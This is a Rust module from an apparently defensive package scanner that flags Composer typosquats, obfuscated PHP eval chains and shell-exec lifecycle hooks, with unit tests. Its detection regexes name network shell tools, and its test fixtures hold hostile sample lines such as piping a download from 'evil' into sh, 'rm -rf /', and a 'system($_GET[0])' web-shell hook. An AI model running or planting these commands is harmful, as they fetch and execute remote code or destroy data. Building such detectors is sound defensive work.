//! Composer / Packagist-specific detection rules.

use argus_core::{Finding, Severity};
use regex::Regex;
use std::sync::OnceLock;

// ---------------------------------------------------------------------------
// Popular Composer packages — typosquat target list
// ---------------------------------------------------------------------------

/// Well-known Composer packages. Drawn from Packagist download stats and
/// known attack targets.
pub const POPULAR_COMPOSER_PACKAGES: &[&str] = &[
    // HTTP clients
    "guzzlehttp/guzzle",
    "guzzlehttp/promises",
    "guzzlehttp/psr7",
    // Symfony
    "symfony/console",
    "symfony/http-foundation",
    "symfony/http-kernel",
    "symfony/routing",
    "symfony/event-dispatcher",
    "symfony/dependency-injection",
    "symfony/finder",
    "symfony/process",
    "symfony/yaml",
    "symfony/dotenv",
    "symfony/mailer",
    "symfony/security-core",
    "symfony/var-dumper",
    // Laravel / Illuminate
    "illuminate/support",
    "illuminate/container",
    "illuminate/database",
    "illuminate/http",
    "illuminate/routing",
    "laravel/framework",
    // PSR / PHP-FIG
    "psr/log",
    "psr/cache",
    "psr/container",
    "psr/http-message",
    "psr/http-client",
    // Testing
    "phpunit/phpunit",
    "mockery/mockery",
    "fakerphp/faker",
    // Doctrine
    "doctrine/orm",
    "doctrine/dbal",
    "doctrine/inflector",
    "doctrine/collections",
    // Logging
    "monolog/monolog",
    // Misc
    "vlucas/phpdotenv",
    "nesbot/carbon",
    "ramsey/uuid",
    "league/flysystem",
    "league/oauth2-server",
    "predis/predis",
    "aws/aws-sdk-php",
    "stripe/stripe-php",
    "twilio/sdk",
    "google/apiclient",
    "phpmailer/phpmailer",
    "swiftmailer/swiftmailer",
    "intervention/image",
    "barryvdh/laravel-debugbar",
    "spatie/laravel-permission",
    "composer/composer",
    "composer/semver",
];

// ---------------------------------------------------------------------------
// PHP-specific regex patterns
// ---------------------------------------------------------------------------

/// PHP `eval()` or `assert()` over a dynamic expression — a common
/// obfuscated-payload delivery mechanism.
pub fn php_eval_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?xi)
            \b
            (?:
                eval \s* \(
                | assert \s* \( \s* \$
            )
            "#,
        )
        .unwrap()
    })
}

/// `base64_decode(...)` used in combination with `eval`.
///
/// Matches both orderings:
/// - `eval(base64_decode($x))` — decode nested inside eval
/// - `base64_decode($x) ... eval(...)` — decode result passed to eval
pub fn php_base64_eval_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?xi)
            (?:
                # eval wrapping base64_decode
                eval \s* \( [^;]{0,200}? base64_decode \s* \(
                |
                # base64_decode result fed to eval later on the same line/nearby
                base64_decode \s* \( .{0,200}? eval \s* \(
                |
                # preg_replace with /e modifier + base64_decode
                preg_replace \s* \( \s* ['"] / [^'"]{0,50} e [^'"]{0,50} ['"]
                    .{0,200}? base64_decode \s* \(
            )
            "#,
        )
        .unwrap()
    })
}

/// Shell-execution functions: `system`, `exec`, `shell_exec`, `passthru`,
/// `proc_open`, backtick operator, `popen`.
pub fn php_shell_exec_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?xi)
            \b
            (?:
                system \s* \(
                | exec \s* \(
                | shell_exec \s* \(
                | passthru \s* \(
                | proc_open \s* \(
                | popen \s* \(
            )
            | ` [^`]{0,200}? `
            "#,
        )
        .unwrap()
    })
}

/// Decode-then-inflate chains: `gzinflate`, `gzuncompress`, `str_rot13`
/// followed by eval — common PHP malware obfuscation.
pub fn php_inflate_eval_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?xi)
            (?:
                gzinflate \s* \(
                | gzuncompress \s* \(
                | str_rot13 \s* \(
            )
            .{0,300}?
            eval \s* \(
            "#,
        )
        .unwrap()
    })
}

/// Detect a shell-exec pattern in a Composer script command string.
/// Used to distinguish `lifecycle-script` (AllowWithApproval) from
/// `lifecycle-script-shell` (High → Block).
pub fn script_shell_exec_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?xi)
            (?:
                php \s+ -r \b
                | \b exec \s* \(
                | \b system \s* \(
                | \b passthru \s* \(
                | \b shell_exec \s* \(
                | \b popen \s* \(
                | \b eval \s* \(
                | \b base64_decode \b
                | \b curl \b
                | \b wget \b
                # Bare shell interpreters, with or without an absolute path,
                # invoked directly as the hook command (e.g. `bash -c 'id'`,
                # `sh -c ...`, `/bin/sh -c ...`, `zsh ...`). A Composer hook is
                # normally a PHP-callable; a direct shell interpreter is an
                # exec surface. `\b` before the name handles both the bare word
                # and the `/bin/` prefix (the `/` is a non-word char).
                | \b (?: sh | bash | zsh | dash | ksh ) \b
                # Destructive / network / permission shell utilities run bare.
                | \b rm \b
                | \b chmod \b
                | \b chown \b
                | \b nc \b
                | \b ncat \b
            )
            "#,
        )
        .unwrap()
    })
}

// ---------------------------------------------------------------------------
// Name-based findings
// ---------------------------------------------------------------------------

/// Push typosquatting + low-reputation findings when `full_name` is one
/// Levenshtein edit away from a popular Composer package.
pub fn push_name_findings(full_name: &str, findings: &mut Vec<Finding>) {
    let lower = full_name.to_ascii_lowercase();
    // Exact match → legitimate, skip.
    if POPULAR_COMPOSER_PACKAGES
        .iter()
        .any(|p| p.eq_ignore_ascii_case(&lower))
    {
        return;
    }
    if let Some(target) = POPULAR_COMPOSER_PACKAGES
        .iter()
        .copied()
        .find(|p| argus_rules::levenshtein(&lower, p) <= 1)
    {
        findings.push(Finding::new(
            "typosquatting",
            Severity::High,
            format!(
                "Composer package `{full_name}` is one edit away from popular package `{target}`"
            ),
        ));
        findings.push(Finding::new(
            "low-reputation",
            Severity::Medium,
            format!("typosquat candidate `{full_name}` has no established reputation on Packagist"),
        ));
    }
}

// ---------------------------------------------------------------------------
// Scan helpers (called from scan.rs)
// ---------------------------------------------------------------------------

/// Scan a PHP source file for dynamic-exec patterns and push findings.
pub fn scan_php_file(content: &str, rel: &str, findings: &mut Vec<Finding>) {
    // eval / assert($var)
    if php_eval_regex().is_match(content) {
        findings.push(Finding::new(
            "php-dynamic-exec",
            Severity::High,
            format!(
                "`{rel}` contains PHP eval() or assert($var) — potential dynamic code execution"
            ),
        ));
    }
    // base64_decode → eval
    if php_base64_eval_regex().is_match(content) {
        findings.push(Finding::new(
            "php-dynamic-exec",
            Severity::High,
            format!(
                "`{rel}` decodes base64 and passes the result to eval — classic obfuscated-payload shape"
            ),
        ));
    }
    // gzinflate / gzuncompress → eval
    if php_inflate_eval_regex().is_match(content) {
        findings.push(Finding::new(
            "php-dynamic-exec",
            Severity::High,
            format!("`{rel}` decompresses then evals — PHP malware obfuscation pattern"),
        ));
    }
    // shell_exec / system / backtick
    if php_shell_exec_regex().is_match(content) {
        findings.push(Finding::new(
            "php-dynamic-exec",
            Severity::High,
            format!("`{rel}` invokes a PHP shell-execution function (system/exec/shell_exec/passthru/proc_open/backtick)"),
        ));
    }
}

/// Evaluate a Composer event hook name + command list and push findings.
///
/// - If any command matches `script_shell_exec_regex`, emit High
///   `lifecycle-script-shell` (→ Block).
/// - Otherwise emit the DOWNGRADE_SAFE `lifecycle-script` (→ AllowWithApproval).
pub fn scan_script_hook(event: &str, commands: &[&str], findings: &mut Vec<Finding>) {
    let has_shell_cmd = commands
        .iter()
        .any(|cmd| script_shell_exec_regex().is_match(cmd));

    if has_shell_cmd {
        for cmd in commands {
            if script_shell_exec_regex().is_match(cmd) {
                findings.push(Finding::new(
                    "lifecycle-script-shell",
                    Severity::High,
                    format!("composer.json `{event}` hook contains a shell-exec command: `{cmd}`"),
                ));
            }
        }
    } else {
        // A PHP-callable script (e.g. `Vendor\\Package::method`) is a
        // lifecycle hook but not a direct shell-exec risk. Pair it with
        // `known-native-build-pattern` (Info) so the decision layer
        // downgrades to AllowWithApproval rather than Block — matching
        // how crates.io handles build-rs-style lifecycle hooks.
        findings.push(Finding::new(
            "lifecycle-script",
            Severity::High,
            format!(
                "composer.json declares `{event}` lifecycle hook: {}",
                commands.join("; ")
            ),
        ));
        findings.push(Finding::new(
            "known-native-build-pattern",
            Severity::Info,
            format!(
                "composer.json `{event}` hook uses a PHP-callable (not a shell command) — \
                 requires human approval but is a common legitimate pattern"
            ),
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn php_eval_fires() {
        assert!(php_eval_regex().is_match("eval($payload);"));
        assert!(php_eval_regex().is_match("eval(base64_decode($x));"));
    }

    #[test]
    fn php_eval_does_not_fire_on_benign() {
        // function named evaluate_something — no false positive
        assert!(!php_eval_regex().is_match("function evaluate_result() {}"));
    }

    #[test]
    fn php_base64_eval_fires() {
        assert!(php_base64_eval_regex().is_match("eval(base64_decode($encoded));"));
    }

    #[test]
    fn php_shell_exec_fires() {
        assert!(php_shell_exec_regex().is_match("system('curl http://evil | sh');"));
        assert!(php_shell_exec_regex().is_match("exec($cmd);"));
        assert!(php_shell_exec_regex().is_match("`ls -la`"));
    }

    #[test]
    fn script_shell_exec_fires() {
        assert!(script_shell_exec_regex().is_match("php -r 'system(\"x\");'"));
        assert!(script_shell_exec_regex().is_match("curl http://evil | bash"));
        assert!(script_shell_exec_regex().is_match("/bin/sh -c 'rm -rf /'"));
    }

    #[test]
    fn script_shell_exec_does_not_fire_on_php_callable() {
        // A PHP-callable like MyVendor\\Installer::postAutoload has no shell tokens.
        assert!(!script_shell_exec_regex().is_match("MyVendor\\\\Installer::postAutoload"));
    }

    #[test]
    fn script_shell_exec_fires_on_bare_shell_lifecycle_commands() {
        // Bare shell interpreters and lifecycle utilities that previously
        // slipped through (no `php -r`, no `(`, no `curl/wget` token).
        assert!(script_shell_exec_regex().is_match("bash -c 'id'"));
        assert!(script_shell_exec_regex().is_match("sh -c 'id'"));
        assert!(script_shell_exec_regex().is_match("zsh -c 'id'"));
        assert!(script_shell_exec_regex().is_match("/bin/sh -c 'id'"));
        assert!(script_shell_exec_regex().is_match("rm -rf vendor"));
        assert!(script_shell_exec_regex().is_match("chmod +x payload"));
    }

    #[test]
    fn scan_script_hook_bare_bash_emits_lifecycle_script_shell() {
        // post-install-cmd: "bash -c 'id'" → lifecycle-script-shell, not the
        // downgraded lifecycle-script.
        let mut findings = Vec::new();
        scan_script_hook("post-install-cmd", &["bash -c 'id'"], &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "lifecycle-script-shell"),
            "got: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
        assert!(!findings.iter().any(|f| f.rule_id == "lifecycle-script"));
    }

    #[test]
    fn push_name_typosquat() {
        let mut findings = Vec::new();
        // "monlog/monolog" is 1 edit from "monolog/monolog"
        push_name_findings("monlog/monolog", &mut findings);
        let ids: Vec<_> = findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(ids.contains(&"typosquatting"), "got: {ids:?}");
        assert!(ids.contains(&"low-reputation"), "got: {ids:?}");
    }

    #[test]
    fn push_name_exact_match_no_findings() {
        let mut findings = Vec::new();
        push_name_findings("monolog/monolog", &mut findings);
        assert!(findings.is_empty());
    }

    #[test]
    fn scan_script_hook_shell_emits_lifecycle_script_shell() {
        let mut findings = Vec::new();
        scan_script_hook(
            "post-install-cmd",
            &["php -r 'system($_GET[0]);'"],
            &mut findings,
        );
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "lifecycle-script-shell"));
        assert!(!findings.iter().any(|f| f.rule_id == "lifecycle-script"));
    }

    #[test]
    fn scan_script_hook_php_callable_emits_lifecycle_script() {
        let mut findings = Vec::new();
        scan_script_hook(
            "post-autoload-dump",
            &["MyVendor\\\\Installer::postAutoload"],
            &mut findings,
        );
        assert!(findings.iter().any(|f| f.rule_id == "lifecycle-script"));
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == "lifecycle-script-shell"));
    }
}
